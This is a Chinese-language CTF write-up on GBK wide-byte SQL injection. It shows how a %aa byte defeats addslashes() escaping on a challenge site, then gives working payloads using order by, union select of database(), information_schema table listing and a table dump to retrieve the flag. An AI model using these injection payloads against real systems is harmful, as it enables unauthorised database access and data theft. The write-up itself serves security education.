# GBK 宽字节注入

### 编码
* 计算机的存储离不开各种编码，常见的编码有 `ASCAll`,`UTF-8`,`GBK`等。
* 通常，一个字符只主要一个字节表示，如`ASCAll`,`7 bit`加上一位校验位表示一个字符
* 但也存在使用多个字节表示一个字符的情况，如`GBK`编码,`GBK-2312`,每个汉字使用两个字节表示，分为高位字节和低位字节
* 一般而言，需要使用多个字节编码的方式，我们称为宽字节编码

## Wide Byte Injection
* `SQL`有一种注入的形式就是宽字节注入,题目节选自[南京邮电大学`CGCTF`](http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1)
* 当我们输入的内容为`http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1'`
* 返回的信息为

* ![](https://github.com/djh-sudo/MISC/blob/main/WEB/src/sql1.jpg)
* 显然，这里对单引号字符进行了转移，常见的函数便是`addslashes()`
* 题目也给出了提示是宽字节注入，因此这里存在宽字节注入的可能
* 具体方式如下，当我们输入一个单引号时，函数`addslashes()`转义结果为`\'`对应的`url`编码为`%5C%27`(两个字节)
* 若高字节大于128，超出了一般的英文字符集，则整个编码会被`GBK-2312`作为一个汉字处理。
* 例如构造`id=1%aa'`，返回结果为`id = '1歿''`,显然，这里的单引号成功逃出编码，前面的`1%aa`被作为一个整体进行了编码，后面的单引号被单独作为一个整体
逃出了编码范围!


## SQL Injection
因此前面修改完成后，后续的`SQL`的注入方式是常规的手工注入，具体过程如下
### 利用`order by`确定列数
* `id=1%aa' order by 1 %23`,不断调整列数，直至报错(二分法),便能够得知表的列数。
* ![](https://github.com/djh-sudo/MISC/blob/main/WEB/src/sql3.jpg)
* `id=1%aa' order by 3 %23`,报错，说明表只有1，2两列(这里`%23`是字符`#`的编码)
### 读取数据库名字
* 函数`database()`
* 使用联合查询，得到数据库的名字，这里要注意的是，查询前面查询的结果要为空才会进一步执行后面的联合查询，
* 否则后面的查询也就没有了意义，因此这里把1，改成一个大一点的数，例如4。
*  `id=4%aa' union select 1,database() %23`
* 返回结果如下，这里得到了数据库的名字为`sae-chinalover`
### 读取数据库中全部的表名字
*  * 一般而言，一个数据库中都会有一个`information_schema`，用于存储数据库的各种信息，包括数据库中所有的表/视图、
*  用户权限等等，因此，获取数据库的表信息，一般通过查询`information_schema`。其中`tables表`存放了各种表的信息。
*  构造查询语句`id=4%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() %23`
*  由于输出受限，因此使用`group_concat`函数，把组中的字符串连接为一个字符串，这样我们一次查询，能够知道全部的表名。
*  `table_schema`就是数据表所属的数据库的名字，其实就是`database()`，只不过这里我们不能写`sae-chinalover`,因为单引号会被转义
查询结果如下，可以看到这里有很多张表
* ![](https://github.com/djh-sudo/MISC/blob/main/WEB/src/sql4.jpg)

### 查询数据
* 由于不知道具体`flag`在那一个表中，因此需要挨个查询一遍
* 当执行`id=4%aa' union select * from ctf4 %23`
* 得到查询结果为`flag{this_is_sqli_flag}`
